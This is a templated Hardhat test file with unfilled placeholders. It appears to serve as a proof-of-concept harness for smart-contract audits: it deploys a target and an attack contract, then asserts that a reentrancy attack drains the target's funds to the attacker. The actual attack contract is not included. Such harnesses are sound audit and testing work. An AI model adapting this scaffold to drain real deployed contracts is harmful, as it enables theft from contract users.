const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("$VULN_NAME_READABLE POC - $TARGET_CONTRACT_NAME", function () {
  let deployer;
  let attacker;
  let target;
  let attackContract;

  beforeEach(async function () {
    [deployer, attacker] = await ethers.getSigners();

    const Target = await ethers.getContractFactory("$TARGET_CONTRACT_NAME");
    target = await Target.connect(deployer).deploy();
    await target.waitForDeployment();

    const Attack = await ethers.getContractFactory("$ATTACK_CONTRACT_NAME");
    attackContract = await Attack.connect(attacker).deploy(
      await target.getAddress()
    );
    await attackContract.waitForDeployment();

    const initialDeposit = ethers.parseEther("1");
    await target
      .connect(deployer)
      .$TARGET_DEPOSIT_FUNCTION({ value: initialDeposit });
  });

  it("exploits reentrancy to drain funds", async function () {
    const attackerInitialBalance = await ethers.provider.getBalance(
      attacker.address
    );

    const tx = await attackContract
      .connect(attacker)
      .attack({ value: ethers.parseEther("0.1") });
    await tx.wait();

    const contractBalance = await ethers.provider.getBalance(
      await target.getAddress()
    );
    const attackerFinalBalance = await ethers.provider.getBalance(
      attacker.address
    );

    expect(contractBalance).to.be.lessThan(ethers.parseEther("0.9"));
    expect(attackerFinalBalance).to.be.greaterThan(attackerInitialBalance);
  });
});

